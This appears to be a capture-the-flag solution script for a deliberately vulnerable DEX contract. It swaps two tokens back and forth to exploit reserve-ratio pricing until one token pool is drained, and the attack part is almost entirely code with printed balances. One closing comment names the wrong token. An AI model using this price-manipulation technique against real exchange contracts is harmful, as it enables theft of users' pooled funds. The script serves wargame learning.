let tokenA = await contract.token1();
let tokenB = await contract.token2();

// If you look at the way the price of a token is calculated, it is some ratio
//  of the tokens that the exchange has in its liquidity pool (multiplied by
//  the amount to swap when returned)

// Using the formula provided in the contract, we can write an equation for the
//  swap price of a token -- letting A be the Dex balance of Token A, and B be
//  the Dex balance of Token B, we have that price_A = B / A and
//  price_B = A / B

(await contract.getSwapPrice(tokenA, tokenB, 10)).toString();
// >> returns 10(this is price_A for 10 of Token A)

(await contract.getSwapPrice(tokenB, tokenA, 10)).toString();
// >> returns 10 (this is price_B for 10 of Token B)

// So, we can work out the initial prices of both tokens -- the Dex has 100 of
//  Token A and Token B, so price_A and price_B are both 10 in a 1:1 ratio of
//  tokens

// So how do we manipulate the price? Since the price is calculated solely
//  based on the Dex reserve values, let's try and change these

// Let's try the simplest way to do this: swap our 10 of Token A for Token B
//  using the Dex

await contract.approve(instance, 10);

await contract.swap(tokenA, tokenB, 10);

(await contract.balanceOf(tokenA, player)).toString();
// >> returns 0

(await contract.balanceOf(tokenB, player)).toString();
// >> returns 20

(await contract.balanceOf(tokenA, instance)).toString();
// >> returns 110

(await contract.balanceOf(tokenB, instance)).toString();
// >> returns 90

// Now, let's see what the swap price of Token B is

(await contract.getSwapPrice(tokenB, tokenA, 20)).toString();
// >> returns 24

// Interestingly, this is no longer a 1:1 ratio of tokens, instead, the ratio
//  is now 24:20 (A:B) -- no longer 1:1

// The reason for this is the way the Dex is computing swap prices: it is
//  assuming that the amount of liquidity in the contract will remain at some
//  constant, which is not always the case, and never adjusting the swap price
//  for the liquidity change that will result from a swap

// So, we swap tokens back and forth using the Dex, and we will eventually
//  drain the Dex of all of one token

await contract.swap(tokenB, tokenA, 20);

(await contract.balanceOf(tokenA, player)).toString();
// >> returns 24

(await contract.balanceOf(tokenB, player)).toString();
// >> returns 0

(await contract.balanceOf(tokenA, instance)).toString();
// >> returns 86

(await contract.balanceOf(tokenB, instance)).toString();
// >> returns 110

await contract.swap(tokenA, tokenB, 24);

(await contract.balanceOf(tokenA, player)).toString();
// >> returns 0

(await contract.balanceOf(tokenB, player)).toString();
// >> returns 30

(await contract.balanceOf(tokenA, instance)).toString();
// >> returns 110

(await contract.balanceOf(tokenB, instance)).toString();
// >> returns 80

await contract.swap(tokenB, tokenA, 30);

(await contract.balanceOf(tokenA, player)).toString();
// >> returns 41

(await contract.balanceOf(tokenB, player)).toString();
// >> returns 0

(await contract.balanceOf(tokenA, instance)).toString();
// >> returns 69

(await contract.balanceOf(tokenB, instance)).toString();
// >> returns 110

await contract.swap(tokenA, tokenB, 41);

(await contract.balanceOf(tokenA, player)).toString();
// >> returns 0

(await contract.balanceOf(tokenB, player)).toString();
// >> returns 65

(await contract.balanceOf(tokenA, instance)).toString();
// >> returns 110

(await contract.balanceOf(tokenB, instance)).toString();
// >> returns 45

// trying to execute
await contract.swap(tokenB, tokenA, 65);
// will revert, because the Dex no longer has enough reserve to complete the
//  swap

(await contract.balanceOf(tokenA, player)).toString();
// >> returns 0

(await contract.balanceOf(tokenB, player)).toString();
// >> returns 65

(await contract.balanceOf(tokenA, instance)).toString();
// >> returns 110

(await contract.balanceOf(tokenB, instance)).toString();
// >> returns 45

// so swap 45 of Token B for the rest of the Dex's Token B reserve
await contract.swap(tokenB, tokenA, 45);

(await contract.balanceOf(tokenA, player)).toString();
// >> returns 110

(await contract.balanceOf(tokenB, player)).toString();
// >> returns 20

(await contract.balanceOf(tokenA, instance)).toString();
// >> returns 0

(await contract.balanceOf(tokenB, instance)).toString();
// >> returns 90

// submit
